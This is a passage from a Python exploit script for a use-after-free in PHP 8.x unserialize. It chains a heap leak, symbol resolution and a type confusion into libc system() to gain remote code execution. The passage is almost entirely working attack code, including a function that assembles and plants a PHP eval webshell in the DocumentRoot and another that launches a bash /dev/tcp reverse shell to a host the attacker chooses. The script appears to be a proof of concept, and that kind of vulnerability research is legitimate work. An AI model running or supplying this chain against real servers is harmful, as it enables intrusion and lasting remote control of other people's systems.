    rce_spray[104 + len(cmd)] = 0
    struct.pack_into('<Q', rce_spray, 120, ce_stdclass)
    struct.pack_into('<Q', rce_spray, 128, spray_addr)
    struct.pack_into('<Q', rce_spray, 136, 1)
    struct.pack_into('<Q', rce_spray, 200, system_addr)

    rce_spray = bytes(rce_spray)
    total = 1 + SPRAY_COUNT + 1
    parts = [f'i:0;{C_PART}'.encode('latin-1')]
    for i in range(SPRAY_COUNT):
        parts.append(f'i:{i+1};s:{SPRAY_LEN}:"'.encode('latin-1') + rce_spray + b'";')
    parts.append(f'i:{SPRAY_COUNT+1};R:{REF_BASE};'.encode('latin-1'))
    payload = b'a:' + str(total).encode() + b':{' + b''.join(parts) + b'}'

    output = send_http(payload)
    time.sleep(0.3)
    return output


_SHELL_SPECIAL = set('<>?$`[](){};&|!*#~"\'\\ \t\n')


def _split_for_echo(content, staging='w'):
    """Split `content` into a list of `echo -n ...>>w` commands, each at most
    14 bytes. Safe runs pack 3 chars per command; a shell-special char is
    backslash-escaped and may be followed by up to one safe char.
    """
    overhead = len(f'echo -n >>{staging}')
    cmds, i = [], 0
    while i < len(content):
        budget = 14 - overhead
        chunk = ''
        if content[i] in _SHELL_SPECIAL:
            chunk = '\\' + content[i]
            i += 1
            budget -= 2
        while budget > 0 and i < len(content) and content[i] not in _SHELL_SPECIAL:
            chunk += content[i]
            i += 1
            budget -= 1
        cmd = f'echo -n {chunk}>>{staging}'
        assert len(cmd) <= 14, f"BUG: {cmd!r} is {len(cmd)} bytes"
        cmds.append(cmd)
    return cmds


def trigger_rce(ce_stdclass, system_addr, spray_addr, cmd):
    """R-7 single-shot: run one command (max 14 bytes after the GC byte)."""
    print(f"\n[Phase R-7] Type confusion to libc system()")
    print(f"  stdClass ce = 0x{ce_stdclass:x}")
    print(f"  system()    = 0x{system_addr:x}")
    print(f"  S           = 0x{spray_addr:x}")
    print(f"  Command (after GC_ADDREF): \\n{cmd[1:].decode('latin-1', errors='replace')}")
    print(f"  Sending RCE payload...")
    output = _fire_cmd(ce_stdclass, system_addr, spray_addr, cmd[1:])
    if output is not None:
        print(f"  Response ({len(output)} bytes): {output[:200]!r}")
    else:
        print(f"  No response (worker may have crashed after execution)")
    return output is not None


WEBSHELL_BODY = '<?=eval($_REQUEST[1])?>'


def drop_webshell(ce_stdclass, system_addr, spray_addr, filename='c.php',
                  body=WEBSHELL_BODY):
    """R-7 multi-stage: assemble a PHP webshell in the DocumentRoot via
    repeated 14-byte `echo -n` triggers, then `mv w <filename>`. Verifies
    by requesting the webshell with a probe payload.
    """
    rename = f'mv w {filename}'
    assert len(rename) <= 14, f"filename too long for 14-byte rename: {filename!r}"
    cmds = ['rm -f w'] + _split_for_echo(body) + [rename]

    print(f"\n[Phase R-7] Dropping webshell {filename!r} via {len(cmds)} system() triggers")
    print(f"  stdClass ce = 0x{ce_stdclass:x}")
    print(f"  system()    = 0x{system_addr:x}")
    print(f"  S           = 0x{spray_addr:x}")
    print(f"  Body:         {body}")

    for i, c in enumerate(cmds, 1):
        print(f"    [{i:2d}/{len(cmds)}] {c}")
        _fire_cmd(ce_stdclass, system_addr, spray_addr, c.encode('latin-1'))

    url = f'http://{HOST}:{PORT}/{filename}'
    print(f"\n  Verifying {url} ...")
    import urllib.request, urllib.parse
    probe = "print('WEBSHELL_OK '.php_uname());"
    try:
        r = urllib.request.urlopen(url + '?1=' + urllib.parse.quote(probe),
                                   timeout=5).read().decode('utf-8', 'replace')
    except Exception as e:
        print(f"  Webshell not reachable: {e}")
        return None
    if 'WEBSHELL_OK' not in r:
        print(f"  Unexpected response: {r[:200]!r}")
        return None
    print(f"  {r}")
    print(f"\n  Webshell deployed: {url}?1=<php-code>")
    return url


def reverse_shell(ce_stdclass, system_addr, spray_addr, lhost, lport):
    """R-7 multi-stage: assemble a bash /dev/tcp reverse shell in the
    DocumentRoot via repeated 14-byte `echo -n` triggers, then `bash w&`.
    Apache's CWD is the DocumentRoot and the PoC image makes it writable.
    """
    script = f"bash -i >&/dev/tcp/{lhost}/{lport} 0>&1"
    cmds = ['rm -f w'] + _split_for_echo(script) + ['bash w&']

    print(f"\n[Phase R-7] Reverse shell to {lhost}:{lport} via {len(cmds)} system() triggers")
    print(f"  stdClass ce = 0x{ce_stdclass:x}")
    print(f"  system()    = 0x{system_addr:x}")
    print(f"  S           = 0x{spray_addr:x}")
    print(f"  Script:       {script}")

    for i, c in enumerate(cmds, 1):
        print(f"    [{i:2d}/{len(cmds)}] {c}")
        _fire_cmd(ce_stdclass, system_addr, spray_addr, c.encode('latin-1'))

    print(f"\n  Reverse shell launched. Check your listener at {lhost}:{lport}.")


# ===========================================================================
# main
# ===========================================================================

def main():
    global HOST, PORT

    parser = argparse.ArgumentParser(
        description='PHP 8.x Serializable var_hash UAF -> RCE')
    parser.add_argument('cmd', nargs='?', default=None,
                        help='single command to run (max 14 bytes); '
                             'default: id>/dev/shm/x')
    parser.add_argument('--host', default='127.0.0.1')
    parser.add_argument('--port', type=int, default=8080)
    parser.add_argument('--reverse', metavar='LHOST:LPORT',
                        help='spawn a bash /dev/tcp reverse shell to LHOST:LPORT '
                             '(multi-stage: writes the script via repeated 14-byte '
                             'system() triggers, then runs it)')
    parser.add_argument('--webshell', nargs='?', const='c.php', metavar='NAME',
                        help='drop <?=eval($_REQUEST[1])?> as NAME in the '
                             'DocumentRoot (default: c.php) via multi-stage echo')
    args = parser.parse_args()
    HOST, PORT = args.host, args.port

    print("=" * 60)
    print("  Full chain: heap -> ELF -> EG -> system() -> RCE")
    print(f"  Target: {HOST}:{PORT}")
    print("=" * 60)

    # R-1
    print("\n[Phase R-1] Heap leak")
    heap_ref = heap_leak()
    if not heap_ref:
        print("FAILED")
        return
    print(f"  heap_ref = 0x{heap_ref:x}")
    chunk = heap_ref & ~0x1FFFFF

    # R-2
    elf_candidates = scan_for_elf(chunk)
    if not elf_candidates:
        print("  No ELF found")
        return

    # R-3: resolve executor_globals + GOT base in libphp.
    print("\n[Phase R-3] Resolving symbols via .gnu_hash")
    elf_base = eg = pltgot = None
    for base, phnum in elf_candidates:
        print(f"  Trying ELF @ 0x{base:x} (phnum={phnum})")
        try:
            eg, pltgot = gnu_hash_resolve(base, 'executor_globals',
                                          '_GLOBAL_OFFSET_TABLE_')
        except RuntimeError as e:
            print(f"    {e}")
            continue
        elf_base = base
        break
    if elf_base is None:
        print("  No candidate exports executor_globals; not libphp")
        return
    print(f"  libphp           = 0x{elf_base:x}")
    print(f"  executor_globals = 0x{eg:x} (offset 0x{eg-elf_base:x})")
    print(f"  PLTGOT           = 0x{pltgot:x}")

    # R-4: dump GOT, find libc, then resolve system().
    libc_base = libc_from_got_dump(elf_base, pltgot)
    if libc_base is None:
        print("  libc not located")
        return
    system_addr = gnu_hash_resolve(libc_base, 'system')
    print(f"  system() = 0x{system_addr:x}")

    # R-5
    ce_stdclass = lookup_class_table(eg, 'stdclass')
    if ce_stdclass is None:
        print("  stdClass ce not resolved")
        return

    # R-6
    spray_addr = find_spray_slot(heap_ref)
    if spray_addr is None:
        print("  spray slot not found")
        return

    # R-7
    if args.reverse:
        lhost, _, lport = args.reverse.rpartition(':')
        if not lhost or not lport.isdigit():
            print(f"  --reverse expects LHOST:LPORT, got {args.reverse!r}")
            return
        reverse_shell(ce_stdclass, system_addr, spray_addr, lhost, int(lport))
        print(f"\n[*] Total requests: {req_count}")
        return

    if args.webshell:
        drop_webshell(ce_stdclass, system_addr, spray_addr, filename=args.webshell)
        print(f"\n[*] Total requests: {req_count}")
        return

    cmd = b"\x09" + (args.cmd.encode('latin-1') if args.cmd else b"id>/dev/shm/x")
    trigger_rce(ce_stdclass, system_addr, spray_addr, cmd)

    if os.path.exists('/dev/shm/x'):
        print(f"\n{'='*60}")
        print(f"  RCE SUCCESS! /dev/shm/x exists")
        with open('/dev/shm/x') as f:
            print(f"  Content: {f.read().strip()}")
        print(f"{'='*60}")
    else:
        print("\n  /dev/shm/x not present on this host (expected when the")
        print("  target is remote or containerized). Verify on the target,")
        print("  e.g.: docker exec <container> cat /dev/shm/x")

    print(f"\n[*] Total requests: {req_count}")


if __name__ == '__main__':
    main()
